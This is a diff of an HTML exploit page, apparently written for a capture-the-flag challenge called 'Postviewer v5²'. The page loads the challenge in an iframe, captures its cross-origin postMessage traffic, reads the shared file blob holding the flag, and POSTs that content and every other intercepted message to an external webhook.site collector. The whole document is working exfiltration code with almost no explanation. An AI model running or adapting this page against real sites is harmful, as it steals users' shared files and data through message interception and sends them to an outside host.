@@ -1,31 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
   <title>Postviewer v5² Exploit</title>
 </head>
 <body>
-  <h1>Running exploit...</h1>
+  <h1>Postviewer v5² Exploit Running…</h1>
+  <p>Waiting for message…</p>
+
   <script>
-    const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
+    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032'; // put your real one here
 
-    // Listen for any messages from the iframe
-    window.addEventListener('message', async (event) => {
-      console.log('[+] Got message:', event.data);
+    console.log('[+] Exploit loaded');
 
-      // Forward to webhook as JSON
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(event.data)
-      });
+    // 1. Setup message listener
+    window.addEventListener('message', async (e) => {
+      console.log('[+] Got message:', e.data);
+
+      // Is this the share message with the flag?
+      if (e.data && e.data.type === 'share') {
+        console.log('[+] Got share message:', e.data);
+
+        // Attempt to read the blob
+        const file = e.data.files?.[0];
+        if (file && file.blob) {
+          console.log('[+] Reading blob…');
+          try {
+            const blob = new Blob([file.blob]);
+            const text = await blob.text();
+            console.log('[+] Blob text:', text);
+
+            await fetch(WEBHOOK, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ flag: text, raw: e.data })
+            });
+
+          } catch (err) {
+            console.error('[!] Failed to read blob:', err);
+            await fetch(WEBHOOK, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ error: err.toString(), raw: e.data })
+            });
+          }
+        } else {
+          console.log('[!] Got message but no blob!');
+          await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ error: 'No blob', raw: e.data })
+          });
+        }
+
+      } else {
+        console.log('[+] Got other message, forwarding anyway.');
+        await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ msg: e.data })
+        });
+      }
     });
 
-    // Create iframe pointing to the challenge
+    // 2. Create iframe that loads the challenge page
     const iframe = document.createElement('iframe');
-    iframe.src = 'http://localhost:1338/';
+    iframe.src = 'http://localhost:1338'; // 🏴‍☠️ Replace with challenge URL if different
     iframe.width = 800;
     iframe.height = 600;
     document.body.appendChild(iframe);
+
+    console.log('[+] Iframe added');
   </script>
 </body>
 </html>
+    
